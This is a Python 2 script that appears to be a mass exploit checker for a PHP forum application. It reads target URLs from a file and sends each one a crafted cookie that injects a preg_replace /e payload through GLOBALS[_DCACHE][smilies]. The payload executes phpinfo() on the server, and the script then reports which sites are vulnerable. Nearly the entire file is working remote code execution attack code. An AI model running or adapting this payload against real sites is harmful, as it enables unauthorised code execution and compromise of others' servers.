# encoding:utf-8

from gevent import monkey
monkey.patch_all()
from gevent.pool import Pool


import requests
import os
import re
import sys
import urllib
import urllib2
import cookielib
import codecs
import re


class Phpinfo(object):

    def __init__(self):

        self.cookies = cookielib.LWPCookieJar()
        handler = [
                urllib2.HTTPHandler(),
                urllib2.HTTPSHandler(),
                urllib2.HTTPCookieProcessor(self.cookies)
                ]
        self.opener = urllib2.build_opener(*handler)


    def get_response(self, url):

        self.opener.open(url)

        new_cookies = ''
        for cookie in self.cookies:
            new_cookies += str(cookie).split()[1] + '; '
        new_cookies += 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();'
        headers = {
                'Cookie':new_cookies
                }
        req = urllib2.Request(url, headers=headers)
        self.response = self.opener.open(req)


    def check_php_info(self):

        pattern = re.compile(ur'HTTP Headers Infomation|Apache Environment|PHP License')
        if pattern.search(self.response.read()):
            return True
        else:
            return False


    def verify(self, url):

        self.get_response(url)
        # print '-' * 50
        if self.check_php_info():
            print '[*] get phpinfo page successfully...'
        else:
            print '[*] get phpinfo page fail...'


def get_urls():

    urls = codecs.open('200.txt', 'r', 'utf-8').readlines()
    return urls


def handle(urls):

    phpinfo = Phpinfo()
    for url in urls:
        phpinfo.verify(url)
        # raw_input('wait.....')


def main():

    urls = get_urls()
    handle(urls)
    # pools = Pool(4)
    # pools.map(handle, urls)


if __name__ == '__main__':
    os.system('clear')

    main()
